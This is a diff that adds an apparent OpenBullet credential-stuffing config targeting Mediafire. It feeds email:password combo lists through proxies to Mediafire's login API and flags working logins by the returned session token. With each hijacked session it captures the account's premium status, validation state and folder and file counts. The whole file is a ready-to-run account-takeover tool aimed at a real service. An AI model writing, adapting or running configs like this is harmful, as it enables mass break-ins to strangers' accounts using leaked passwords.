@@ -1,0 +1,73 @@
+[SETTINGS]
+{
+  "Name": "Mediafire",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-18T14:42:43.0988688+02:00",
+  "AdditionalInfo": "MailPass",
+  "Author": "St0x",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://www.mediafire.com/application/login.php?" 
+  CONTENT "email=<USER>&password=<PASS>&remember=true&application_id=6&response_format=json" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.mediafire.com" 
+  HEADER "referer: https://m.mediafire.com/login/email" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "session_token" 
+  KEYCHAIN Failure OR 
+    KEY "You have entered an invalid login" 
+
+PARSE "<SOURCE>" LR "{\"session_token\":\"" "\"" -> VAR "TOKEN" 
+
+#USER REQUEST POST "https://www.mediafire.com/api/1.4/user/get_info.php?" 
+  CONTENT "application_id=6&response_format=json&session_token=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.mediafire.com" 
+  HEADER "referer: https://m.mediafire.com/login/email" 
+
+#Premium PARSE "<SOURCE>" LR "premium\":\"" "\"" -> CAP "Premium" "Premium:" " | " 
+
+#Validated PARSE "<SOURCE>" LR "validated\":\"" "\"" -> CAP "Validated" "Validated:" " | " 
+
+#FOLDER REQUEST POST "https://www.mediafire.com/api/1.4/folder/get_info.php?" 
+  CONTENT "folder_key=myfiles&application_id=6&response_format=json&session_token=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.mediafire.com" 
+  HEADER "referer: https://m.mediafire.com/login/email" 
+
+#FolderAmont PARSE "<SOURCE>" LR "folder_count\":\"" "\"" -> CAP "FolderAmount" "Folders:" " | " 
+
+#FileAmount PARSE "<SOURCE>" LR "file_count\":\"" "\"" -> CAP "FileAmount" "Files:" " | " 
+
